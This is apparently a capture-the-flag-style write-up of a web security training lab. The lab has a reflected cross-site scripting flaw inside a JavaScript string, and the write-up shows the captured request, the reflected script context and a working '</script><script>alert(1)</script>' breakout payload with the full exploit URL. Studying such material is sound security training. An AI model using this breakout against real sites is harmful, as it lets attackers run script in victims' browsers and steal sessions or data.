## 18 - Reflected XSS into a JavaScript string with single quote and backslash escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

## Notes

- Search page
- Possibility to leave a comment on a post

## Resume

1. Capture a search request
2. Identify the reflected JavaScript context
3. Escape the script block
4. Inject a new JavaScript payload
5. Trigger the XSS

## Solve

First, capture a search request:

```http
GET /?search=pouet HTTP/2
Host: 0a62003f0493b4de80960d1500a300e2.web-security-academy.net
```

The reflected value appears inside a JavaScript string:

```html
<script>
    var searchTerms = 'pouet';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

This confirms that user input is reflected inside a JavaScript context.

Try the following payload:

```text
test'payload
```

The single quote is escaped with a backslash:

```javascript
var searchTerms = 'test\'payload';
```

This prevents directly breaking out of the JavaScript string.

Instead of escaping the string, inject a closing \`</script>\` tag to terminate the current script block and create a new one.

Payload:

```html
</script><script>alert(1)</script>
```

Final URL:

```text
https://0a62003f0493b4de80960d1500a300e2.web-security-academy.net/?search=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
```

The payload closes the existing script tag:

```html
</script>
```

Then injects a new malicious script block:

```html
<script>alert(1)</script>
```

Resulting HTML:

```html
<script>
    var searchTerms = '</script><script>alert(1)</script>';
</script>
```

The browser interprets the injected closing tag before JavaScript parsing is completed, allowing the attacker to inject arbitrary JavaScript.

When the page loads, the browser executes:

```javascript
alert(1)
```

This triggers the XSS and solves the lab.

